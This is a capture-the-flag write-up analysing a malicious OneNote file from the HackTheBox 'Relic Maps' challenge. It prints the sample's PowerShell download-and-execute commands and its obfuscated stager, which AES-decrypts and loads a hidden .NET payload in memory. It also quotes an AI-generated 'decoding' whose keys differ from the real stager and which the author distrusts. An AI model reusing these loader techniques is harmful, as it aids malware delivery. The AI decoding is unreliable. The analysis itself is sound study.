Given a docker container and a url: `http://relicmaps.htb:<port>/relicmaps.one`

# Solution
Resolve the hostname in `/etc/hosts`

This gives a relicmaps.one file.

Binwalk:
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
10388         0x2894          PNG image, 1422 x 900, 8-bit/color RGBA, non-interlaced
10924         0x2AAC          Zlib compressed data, best compression
47215         0xB86F          HTML document header
48865         0xBEE1          HTML document footer
50084         0xC3A4          PNG image, 32 x 32, 8-bit/color RGBA, non-interlaced
50636         0xC5CC          PNG image, 440 x 66, 8-bit/color RGB, non-interlaced
50727         0xC627          Zlib compressed data, compressed

```

IDK how to use dd so just going to strings the file and manually pull the html doc, which has a powershell command.
```powershell
ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"
	    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
```

This downloads two files `http://relicmaps.htb/uploads/soft/topsecret-maps.one` and `http://relicmaps.htb/get/DdAbds/window.bat` which get run as proceses.

topsecretmaps.one seems to pull down the window.bat file.

the window.bat file seems interesting. There is a b64 blob but it doesn't seem to go anywhere.

After deobfuscating the bat file with a python script:
```python
dict = {}
with open('window.bat','r') as f:
    for line in f:
        if line[0] =="%" and line[5] == '%':
            line = line[7:-2]
            name = line[:10]
            value = line[11:]
            dict[name] = value
        else:
            obfs = line.split("%")
            out = ''
            for i in obfs:
                if len(i) ==10 and '@' not in i:
                    out+=dict[i]
            print(out)

```
there is a ps1 script:
```powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "%~0.exe"

cd "%~dp0"
"%~nx0.exe" -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine);foreach ($YiLGW in $eIfqq) { if ($YiLGW.StartsWith(':: ')) {  $VuGcO = $YiLGW.Substring(3); break; }; };$uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO);$BacUA = New-Object System.Security.Cryptography.AesManaged;$BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC;$BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=');$BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==');$Nlgap = $BacUA.CreateDecryptor();$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length);$Nlgap.Dispose();$BacUA.Dispose();$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm);$bTMLk = New-Object System.IO.MemoryStream;$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress);$NVPbn.CopyTo($bTMLk);$NVPbn.Dispose();$mNKMr.Dispose();$bTMLk.Dispose();$uZOcm = $bTMLk.ToArray();$gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm);$PtfdQ = $gDBNO.EntryPoint;$PtfdQ.Invoke($null, (, [string[]] ('%*')))
```
Which uses the base64 blob which was encoded.

Chatgpt decodes it to be the following:
```
# Get the script's file path and name
$scriptPath = "$($MyInvocation.MyCommand.Path)"

# Find the first comment in the script
$scriptContent = Get-Content $scriptPath
foreach ($line in $scriptContent) {
    if ($line.StartsWith(':: ')) {
        $comment = $line.Substring(3)
        break
    }
}

# Decrypt and decompress the payload
$encryptedPayload = [Convert]::FromBase64String('LkEaRUbq5nx5r5w5mZl5YYiylX9YCLzRqwRfzeFJbjM=')
$key = [Convert]::FromBase64String('3be52kC6dsTNseetP84UzxMZcU6MBHlVLfBOWcnIqnA=')
$iv = [Convert]::FromBase64String('7JQ2Ex+vbG7Vh8mn/ubk0w==')
$aes = New-Object Security.Cryptography.AesManaged
$aes.Mode = [Security.Cryptography.CipherMode]::CBC
$aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = $iv
$decryptor = $aes.CreateDecryptor()
$decryptedPayload = $decryptor.TransformFinalBlock($encryptedPayload, 0, $encryptedPayload.Length)
$decryptor.Dispose()
$aes.Dispose()

# Decompress the decrypted payload
$compressedPayload = New-Object IO.MemoryStream(,$decryptedPayload)
$decompressedPayload = New-Object IO.MemoryStream
$gzipStream = New-Object IO.Compression.GZipStream($compressedPayload, [IO.Compression.CompressionMode]::Decompress)
$gzipStream.CopyTo($decompressedPayload)
$gzipStream.Dispose()
$compressedPayload.Dispose()
$decompressedPayload.Dispose()

# Execute the payload
$assembly = [System.Reflection.Assembly]::Load($decompressedPayload.ToArray())
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] ($args)))
```

I dont trust the above. So time to decode manually Or even better just going to run the stager without the execution phase, printing it out instead.

This gives a byte dump. Converting in python.
```python
x = ''
for line in open('byte.dmp','r'):
	line = line.strip().split(' ')
	for i in line:
		if i!='0':
			x+=chr(int(i))
with open('stage3.ps1','w') as f:
	f.write(x+'\n')
```

Looking at the file there is the flag:
```
HTB{0neN0Te?_iT'5_4_tr4P!}
```

Very fun challenge!